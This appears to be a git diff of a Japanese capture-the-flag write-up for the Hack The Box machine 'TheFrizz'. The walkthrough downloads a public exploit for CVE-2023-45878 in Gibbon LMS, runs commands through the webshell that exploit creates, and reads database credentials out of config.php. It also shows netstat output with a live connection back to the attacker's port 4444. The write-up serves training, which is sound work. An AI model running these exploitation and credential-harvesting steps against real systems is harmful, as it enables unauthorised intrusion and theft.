@@ -55,7 +55,8 @@ hostsを編集
 このwebはgibbon v25.0.000で動作しているっぽい  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/TheFrizz_02.png">  
 gibbon v25.0.000はcve-2023-45878の対象であり、認証なしでrceが可能である  
-PoCをダウンロードして実行
+PoCをダウンロードして実行  
+PoCは、rceでwebshellを作成しそのwebshell経由でコマンド実行しているっぽい  
 ```sh
 └─$ wget -nv https://raw.githubusercontent.com/davidzzo23/CVE-2023-45878/refs/heads/main/CVE-2023-45878.py             
 2025-10-29 09:02:53 URL:https://raw.githubusercontent.com/davidzzo23/CVE-2023-45878/refs/heads/main/CVE-2023-45878.py [3697/3697] -> "CVE-2023-45878.py" [1]
@@ -92,4 +93,60 @@ PS C:\xampp\htdocs\Gibbon-LMS> whoami
 frizz\w.webservice
 ```
 
+
 ## STEP 3
+データベース用のクレデンシャルを発見
+```powershell
+PS C:\xampp\htdocs\Gibbon-LMS> cat config.php
+
+~~~
+
+/**
+ * Sets the database connection information.
+ * You can supply an optional $databasePort if your server requires one.
+ */
+$databaseServer = 'localhost';
+$databaseUsername = 'MrGibbonsDB';
+$databasePassword = 'MisterGibbs!Parrot!?1';
+$databaseName = 'gibbon';
+
+
+~~~
+```
+step1で確認できなかった3306番のオープンを確認  
+mysqlが動作して要るっぽい
+```powershell
+PS C:\xampp\htdocs\Gibbon-LMS> netstat /ano /p tcp
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       1480
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2032
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       956
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       956
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       4088
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       1952
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       492
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       664
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       1224
+  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:57382          0.0.0.0:0              LISTENING       636
+  TCP    0.0.0.0:61666          0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:61670          0.0.0.0:0              LISTENING       1980
+  TCP    0.0.0.0:61681          0.0.0.0:0              LISTENING       1964
+  TCP    10.129.232.168:53      0.0.0.0:0              LISTENING       1980
+  TCP    10.129.232.168:80      10.10.16.28:59126      CLOSE_WAIT      2032
+  TCP    10.129.232.168:139     0.0.0.0:0              LISTENING       4
+  TCP    10.129.232.168:50164   10.10.16.28:4444       ESTABLISHED     3560
+  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       1980
+```
